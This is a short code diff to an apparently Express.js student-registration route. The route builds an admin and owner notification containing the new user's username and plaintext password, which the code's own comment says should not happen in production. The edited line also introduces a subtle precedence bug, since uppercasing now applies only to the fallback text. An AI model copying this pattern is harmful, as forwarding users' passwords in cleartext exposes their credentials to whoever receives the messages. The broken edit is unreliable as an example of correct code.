@@ -646,7 +646,7 @@ app.post("/student/register", async (req, res) => {
     // Notify admin & owner (don't expose password in logs or persistent messages in production — this matches your prior behavior but consider removing)
     const platformName = (platform || "NEXA").toString();
     const adminMsg = `
-🌟NEW ${location.country.toUpperCase()} CLIENT ${location.flag || "Unknown"}
+🌟NEW ${location.country||"Unknown country".toUpperCase()} CLIENT ${location.flag || "Unknown"}
 Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
 \n Password: *${password}*
